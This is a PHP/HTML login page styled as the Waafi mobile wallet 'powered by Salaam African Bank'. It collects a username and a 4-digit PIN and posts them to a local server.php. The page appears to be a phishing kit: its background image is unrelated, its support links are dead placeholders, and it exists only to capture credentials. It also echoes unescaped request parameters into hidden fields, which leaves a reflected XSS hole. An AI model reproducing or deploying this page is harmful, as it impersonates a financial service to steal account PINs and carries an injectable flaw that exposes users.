<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Waafi Login</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: Arial, Helvetica, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0f2530;
    }

    .screen {
      position: relative;
      width: 340px;
      height: 680px;
      overflow: hidden;
      background: url('Commercial-office-cleaning-Services-Upperhill.webp') center/cover no-repeat;
      color: #fff;
    }

    .screen::before {
      content: "";
      position: absolute;
      inset: 0;
      background: rgba(13, 40, 52, 0.58);
    }

    .content {
      position: relative;
      z-index: 1;
      height: 100%;
      display: flex;
      flex-direction: column;
      padding: 34px 26px 24px;
    }

    .brand {
      text-align: center;
      margin-top: 6px;
      margin-bottom: 82px;
    }

    .logo-wrap {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-bottom: 6px;
    }

    .logo-placeholder {
      width: 56px;
      height: 56px;
      border: 2px dashed rgba(255,255,255,0.6);
      border-radius: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 11px;
      text-align: center;
      padding: 6px;
      line-height: 1.2;
    }

    .brand h1 {
      font-size: 22px;
      font-weight: 600;
      letter-spacing: 0.2px;
    }

    .tagline {
      font-size: 13px;
      color: rgba(255,255,255,0.95);
      margin-top: 4px;
    }

    .form-group {
      margin-bottom: 22px;
    }

    .input-row {
      display: flex;
      align-items: center;
      gap: 10px;
      border-bottom: 1px solid rgba(255,255,255,0.45);
      padding-bottom: 10px;
    }

    .icon {
      width: 18px;
      min-width: 18px;
      height: 18px;
      opacity: 0.95;
    }

    .input-row input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      font-size: 15px;
    }

    .input-row input::placeholder {
      color: rgba(255,255,255,0.9);
    }

    .login-btn {
      width: 100%;
      border: none;
      background: #39c33d;
      color: #fff;
      font-size: 18px;
      font-weight: 500;
      padding: 12px 16px;
      border-radius: 2px;
      cursor: pointer;
      margin-top: 8px;
      box-shadow: 0 1px 0 rgba(0,0,0,0.15);
    }

    .login-btn:hover {
      background: #35b839;
    }

    .links {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      margin-top: 16px;
      margin-bottom: auto;
    }

    .links a,
    .footer-links a {
      color: #fff;
      text-decoration: none;
    }

    .links a:hover,
    .footer-links a:hover {
      text-decoration: underline;
    }

    .bottom {
      text-align: center;
      font-size: 12px;
      line-height: 1.7;
      color: rgba(255,255,255,0.95);
      padding-top: 14px;
    }

    .footer-links {
      margin-bottom: 8px;
    }

    .footer-links span {
      margin: 0 4px;
      color: rgba(255,255,255,0.8);
    }

    .powered {
      font-size: 12px;
      font-weight: 600;
    }

    .bank {
      font-size: 12px;
    }

    @media (max-width: 380px) {
      .screen {
        width: 100vw;
        height: 100vh;
      }
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="content">
      <div class="brand">
        <div class="logo-wrap">
          <img src="WAAFI-LOGO.png" alt="Waafi Logo" style="width:56px; height:auto;">
          <h1>Waafi</h1>
        </div>
        <div class="tagline">Life Just got Simplified !</div>
      </div>

      <form action="server.php" method="POST">
        
        <div class="form-group">
          <div class="input-row">
            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M20 21a8 8 0 0 0-16 0"></path>
              <circle cx="12" cy="7" r="4"></circle>
            </svg>
            <input type="hidden" name="mobile" value="<?php echo $_REQUEST['mobile'] ?>" >
            <input type="hidden" name="package" value="<?php echo $_REQUEST['package'] ?>" >
            <input type="text" name="username" placeholder="Username" />
          </div>
        </div>

        <div class="form-group">
          <div class="input-row">
            <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <rect x="3" y="11" width="18" height="10" rx="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
            <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="4"  name="password" placeholder="••••" required/>
          </div>
        </div>

        <button class="login-btn" type="submit">Login</button>
      </form>

      <div class="links">
        <a href="#">Forgot Password.?</a>
        <a href="#">New User.? Sign Up.</a>
      </div>

      <div class="bottom">
        <div class="footer-links">
          <a href="#">Privacy Policy</a><span>|</span>
          <a href="#">About WAAFI</a><span>|</span>
          <a href="#">Contact Us</a>
        </div>
        <div class="powered">Powered By</div>
        <div class="bank">Salaam African Bank</div>
      </div>
    </div>
  </div>
</body>
</html>
